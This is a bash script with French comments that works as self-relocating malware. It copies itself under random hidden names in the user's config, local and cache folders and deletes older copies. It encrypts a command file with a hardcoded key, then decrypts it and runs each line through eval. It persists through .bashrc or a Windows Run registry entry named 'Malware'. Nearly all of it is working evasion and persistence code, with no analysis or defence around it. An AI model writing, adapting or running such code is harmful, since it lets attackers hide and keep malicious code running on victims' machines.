#!/bin/bash

# --- CONFIGURATION ---
SLEEP_INTERVAL=300  # Temps entre chaque mutation (en secondes)
MUTATION_DIRS=("$HOME/.config" "$HOME/.local" "$HOME/.cache")
MUTATION_PREFIX=".script_"
CMD_PREFIX=".cmd_"
CMD_TRACK_FILE="$HOME/.last_command_file"
ENCRYPTION_KEY="ma_clé_secrète_pour_cryptage"  # Remplace ceci par une clé plus complexe et secrète

# --- DÉTECTION OS ---
OS=$(uname)

# --- DÉTECTION LANGUE ---
if [[ "$OS" == "Linux" || "$OS" == "Darwin" ]]; then
    LANG_CODE=$(echo $LANG | cut -d'_' -f1)
fi

# --- AUTO-MUTATION ---
RANDOM_DIR=${MUTATION_DIRS[$RANDOM % ${#MUTATION_DIRS[@]}]}
mkdir -p "$RANDOM_DIR"
RANDOM_NAME="${MUTATION_PREFIX}$(date +%s)_$RANDOM.sh"
NEW_PATH="$RANDOM_DIR/$RANDOM_NAME"

# --- NETTOYAGE ANCIENNES COPIES ---
for dir in "${MUTATION_DIRS[@]}"; do
    find "$dir" -maxdepth 1 -type f -name "${MUTATION_PREFIX}*.sh" ! -samefile "$0" -exec rm -f {} \;
done

# --- Mutation (copie et relance) ---
if [[ "$0" != "$NEW_PATH" ]]; then
    cp "$0" "$NEW_PATH"
    chmod +x "$NEW_PATH"
    echo "[*] Mutation : $NEW_PATH"
    "$NEW_PATH" &
    exit 0
fi

# --- FICHIER DE COMMANDES : recherche ou mutation ---
if [[ -f "$CMD_TRACK_FILE" ]]; then
    COMMAND_FILE=$(<"$CMD_TRACK_FILE")
else
    # Première fois, créer et déplacer
    ORIG_CMD="$HOME/commandes.txt"
    if [[ -f "$ORIG_CMD" ]]; then
        CMD_DIR=${MUTATION_DIRS[$RANDOM % ${#MUTATION_DIRS[@]}]}
        mkdir -p "$CMD_DIR"
        CMD_NAME="${CMD_PREFIX}$(date +%s)_$RANDOM.txt"
        COMMAND_FILE="$CMD_DIR/$CMD_NAME"

        # Ajouter les lignes spécifiques avant de crypter le fichier commandes.txt
        echo "chmod +x execute.sh" >> "$ORIG_CMD"
        echo "./execute.sh" >> "$ORIG_CMD"

        # Crypter le fichier commandes.txt avant de le déplacer
        openssl enc -aes-256-cbc -salt -in "$ORIG_CMD" -out "$COMMAND_FILE.enc" -pass pass:"$ENCRYPTION_KEY"
        rm "$ORIG_CMD"  # Supprimer l'original non crypté
        echo "$COMMAND_FILE.enc" > "$CMD_TRACK_FILE"  # Stocker le chemin du fichier crypté
    else
        echo "Aucun fichier commande trouvé."
        COMMAND_FILE=""
    fi
fi

# --- EXÉCUTION DES COMMANDES ---
if [[ -f "$COMMAND_FILE" ]]; then
    echo "[*] Fichier commande trouvé : $COMMAND_FILE"
    # Décryptage du fichier avant d'exécuter les commandes
    DECRYPTED_CMD_FILE="$COMMAND_FILE.dec"
    openssl enc -d -aes-256-cbc -in "$COMMAND_FILE" -out "$DECRYPTED_CMD_FILE" -pass pass:"$ENCRYPTION_KEY"
    
    # Lire et exécuter les commandes après décryptage
    while IFS= read -r line || [[ -n "$line" ]]; do
        echo "[*] Exécution : $line"
        eval "$line"
    done < "$DECRYPTED_CMD_FILE"
    
    # Nettoyage du fichier temporaire décrypté
    rm -f "$DECRYPTED_CMD_FILE"
else
    echo "[-] Fichier de commandes introuvable ou supprimé."
fi

# --- PERSISTANCE AU DÉMARRAGE ---
case "$OS" in
    "Linux"|"Darwin")
        if ! grep -q "$NEW_PATH" "$HOME/.bashrc"; then
            echo "$NEW_PATH &" >> "$HOME/.bashrc"
            echo "[+] Persistance ajoutée à .bashrc"
        fi
        ;;
    "MINGW"*|"MSYS"*|"CYGWIN"*)
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Malware" /t REG_SZ /d "\"$NEW_PATH\"" /f >nul 2>&1
        echo "[+] Persistance ajoutée au registre Windows"
        ;;
    *)
        echo "[-] Persistance non supportée pour cet OS."
        ;;
esac

# --- BOUCLE DE MUTATION & RELOCALISATION DU FICHIER COMMANDE ---
while true; do
    sleep "$SLEEP_INTERVAL"

    # Mutation script
    NEW_NAME="${MUTATION_PREFIX}$(date +%s)_$RANDOM.sh"
    NEW_SCRIPT="$RANDOM_DIR/$NEW_NAME"
    cp "$0" "$NEW_SCRIPT"
    chmod +x "$NEW_SCRIPT"
    echo "[*] Mutation cyclique : $NEW_SCRIPT"

    # Mutation du fichier commande s’il existe
    if [[ -f "$COMMAND_FILE" ]]; then
        NEW_CMD_NAME="${CMD_PREFIX}$(date +%s)_$RANDOM.txt"
        NEW_CMD_DIR=${MUTATION_DIRS[$RANDOM % ${#MUTATION_DIRS[@]}]}
        mkdir -p "$NEW_CMD_DIR"
        NEW_CMD_PATH="$NEW_CMD_DIR/$NEW_CMD_NAME"
        
        # Crypter et déplacer le fichier commande
        openssl enc -aes-256-cbc -salt -in "$COMMAND_FILE" -out "$NEW_CMD_PATH.enc" -pass pass:"$ENCRYPTION_KEY"
        rm "$COMMAND_FILE"
        echo "$NEW_CMD_PATH.enc" > "$CMD_TRACK_FILE"
        echo "[*] Fichier commande déplacé et crypté vers : $NEW_CMD_PATH.enc"
    fi

    "$NEW_SCRIPT" &
    exit 0
done
